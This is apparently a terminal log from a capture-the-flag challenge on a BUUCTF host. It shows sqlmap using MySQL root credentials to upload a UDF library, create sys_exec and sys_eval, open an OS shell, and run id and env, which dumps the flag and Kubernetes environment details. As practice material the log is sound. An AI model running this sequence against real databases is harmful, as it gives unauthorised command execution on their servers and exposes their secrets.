┌──(root㉿pptest)-[~]
└─# sqlmap -d "mysql://root:`echo $pass`@node4.buuoj.cn:29267/mysql" --os-shell --no-cast
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:14:34 /2023-03-08/

[13:14:36] [INFO] connection to MySQL server 'node4.buuoj.cn:29267' established
[13:14:36] [INFO] testing MySQL
[13:14:36] [INFO] resumed: [['1']]...
[13:14:36] [INFO] confirming MySQL
[13:14:36] [INFO] resumed: [['1']]...
[13:14:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[13:14:36] [INFO] fingerprinting the back-end DBMS operating system
[13:14:36] [INFO] resumed: [['0']]...
[13:14:36] [INFO] the back-end DBMS operating system is Linux
[13:14:36] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, "Unknown table 'sqlmapfile'")
[13:14:37] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, "Unknown table 'sqlmapfilehex'")
[13:14:37] [INFO] testing if current user is DBA
[13:14:37] [INFO] fetching current user
[13:14:37] [INFO] resumed: [['root@%']]...
[13:14:37] [INFO] resumed: [['1']]...
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[13:14:39] [INFO] checking if UDF 'sys_exec' already exist
[13:14:39] [INFO] checking if UDF 'sys_eval' already exist
[13:14:39] [INFO] detecting back-end DBMS version from its banner
[13:14:39] [INFO] resumed: [['5.5.23']]...
[13:14:39] [INFO] retrieving MySQL plugin directory absolute path
[13:14:39] [INFO] resumed: [['/usr/local/mysql/lib/plugin/']]...
[13:14:39] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, "Unknown table 'sqlmapfile'")

[13:14:57] [INFO] the local file '/tmp/sqlmap6q23s7hu1416464/lib_mysqludf_syszak9c093.so' and the remote file '/usr/local/mysql/lib/plugin/libsbcax.so' have the same size (8040 B)
[13:14:57] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, "Unknown table 'sqlmapfilehex'")
[13:14:57] [INFO] creating UDF 'sys_exec' from the binary UDF file
[13:14:58] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1305, 'FUNCTION mysql.sys_exec does not exist')
[13:14:58] [INFO] creating UDF 'sys_eval' from the binary UDF file
[13:14:58] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1305, 'FUNCTION mysql.sys_eval does not exist')
[13:14:59] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, "Unknown table 'sqlmapoutput'")
[13:15:00] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[13:15:00] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
os-shell> id
do you want to retrieve the command standard output? [Y/n/a]
command standard output: 'uid=999(mysql) gid=1000(mysql) groups=1000(mysql)'
os-shell> env
do you want to retrieve the command standard output? [Y/n/a]
command standard output:
---
KUBERNETES_PORT=tcp://10.240.0.1:443
KUBERNETES_SERVICE_PORT=443
MYSQL_HOME=/usr/local/mysql
HOSTNAME=out
SHLVL=1
HOME=/root
_=/usr/local/bin/mysqld_safe
KUBERNETES_PORT_443_TCP_ADDR=10.240.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.240.0.1:443
KUBERNETES_SERVICE_HOST=10.240.0.1
PWD=/usr/local/mysql/data
FLAG=flag{660cb4fe-207b-47e2-a84e-96de5e8444be}
---
os-shell>